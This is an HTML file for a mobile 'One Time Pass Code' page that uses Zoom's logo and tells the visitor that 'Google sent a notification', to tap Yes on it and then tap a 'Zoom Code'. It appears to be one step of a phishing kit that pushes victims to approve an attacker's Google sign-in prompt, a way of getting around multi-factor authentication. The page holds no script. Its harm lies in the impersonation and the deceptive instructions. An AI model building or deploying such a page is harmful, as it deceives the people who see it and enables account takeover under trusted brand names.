<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />

  <meta
    name="viewport"
    content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
  />

  <title>One Time Pass Code</title>

  <link rel="icon" type="image/png" href="../../logo.png" />

  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI",
        Roboto, Helvetica, Arial, sans-serif;
    }

    html,
    body {
      width: 100%;
      height: 100%;
      background: #ffffff;
      color: #202124;
      overflow: hidden;
    }

    body {
      display: flex;
      justify-content: center;
      align-items: center;
    }

    /* iPhone 12 style responsive container */
    .container {
      width: 100%;
      max-width: 390px;
      height: 100vh;
      min-height: 100vh;

      display: flex;
      flex-direction: column;
      align-items: center;

      text-align: center;

      background: #ffffff;

      padding: 38px 24px 30px;
    }

    /* Main Content */
    .content-box {
      width: 100%;

      display: flex;
      flex-direction: column;
      align-items: center;
    }

    /* Zoom Logo */
    .logo {
      width: 55px;
      height: auto;

      object-fit: contain;

      margin-bottom: 30px;
    }

    /* Main Title */
    h1 {
      font-size: 21px;
      line-height: 1.2;
      font-weight: 700;

      color: #111111;

      margin-bottom: 28px;
    }

    /* Phone Illustration */
    .phone-illustration {
      width: 205px;
      max-width: 58vw;
      height: auto;

      display: block;
      object-fit: contain;

      margin-bottom: 25px;
    }

    /* Check your phone */
    h2 {
      font-size: 18px;
      line-height: 1.25;

      font-weight: 700;

      color: #111111;

      margin-bottom: 7px;
    }

    /* Description */
    .desc-text {
      font-size: 14px;
      line-height: 1.5;

      font-weight: 500;

      color: #1f2937;
    }

    .desc-text span {
      font-weight: 800;
      color: #000000;
    }

    /* Resend Button */
    .btn-join {
      width: 100%;
      max-width: 320px;

      height: 48px;

      margin-top: 18px;

      background: #007aff;
      color: #ffffff;

      border: none;
      border-radius: 10px;

      font-size: 14px;
      font-weight: 700;

      cursor: pointer;

      box-shadow: 0 4px 12px rgba(0, 122, 255, 0.25);

      transition:
        background-color 0.2s,
        transform 0.1s;
    }

    .btn-join:hover {
      background: #006fe6;
    }

    .btn-join:active {
      transform: scale(0.98);
    }

    /* --------------------------------
       iPhone 12 / 390x844 adjustment
       -------------------------------- */
    @media (min-width: 380px) and (min-height: 800px) {

      .container {
        padding-top: 42px;
      }

      .logo {
        width: 55px;
        margin-bottom: 31px;
      }

      h1 {
        font-size: 21px;
        margin-bottom: 29px;
      }

      .phone-illustration {
        width: 210px;
        margin-bottom: 25px;
      }

      h2 {
        font-size: 18px;
        margin-bottom: 7px;
      }

      .desc-text {
        font-size: 14px;
        line-height: 1.5;
      }

      .btn-join {
        margin-top: 18px;
        height: 48px;
      }
    }

    /* Smaller phones */
    @media (max-width: 360px) {

      .container {
        padding: 28px 20px 24px;
      }

      .logo {
        width: 48px;
        margin-bottom: 24px;
      }

      h1 {
        font-size: 19px;
        margin-bottom: 23px;
      }

      .phone-illustration {
        width: 180px;
        margin-bottom: 20px;
      }

      h2 {
        font-size: 16px;
      }

      .desc-text {
        font-size: 13px;
      }

      .btn-join {
        height: 46px;
        margin-top: 15px;
      }
    }

    /* Short screen phones */
    @media (max-height: 700px) {

      .container {
        padding-top: 22px;
      }

      .logo {
        margin-bottom: 20px;
      }

      h1 {
        margin-bottom: 20px;
      }

      .phone-illustration {
        width: 175px;
        margin-bottom: 18px;
      }

      .btn-join {
        margin-top: 14px;
      }
    }
  </style>
</head>

<body>

  <div class="container">

    <div class="content-box">

      <!-- Zoom Logo -->
      <img
        class="logo"
        src="../../Zoom-Logo.png"
        alt="Zoom Logo"
      />

      <!-- Title -->
      <h1>One Time Pass Code</h1>

      <!-- Phone Illustration -->
      <img
        class="phone-illustration"
        src="../icon.gif"
        alt="Phone Illustration"
      />

      <!-- Heading -->
      <h2>Check your phone.</h2>

      <!-- Description -->
      <p class="desc-text">
        Google sent a notification to your phone.<br />
        <span>Tap Yes</span> on the notification<br />
        Then Tap Zoom Code
      </p>

    </div>

    <!-- Resend -->
    <button
      class="btn-join"
      onclick="window.location.href='../'"
    >
      Resend
    </button>

  </div>

</body>
</html>
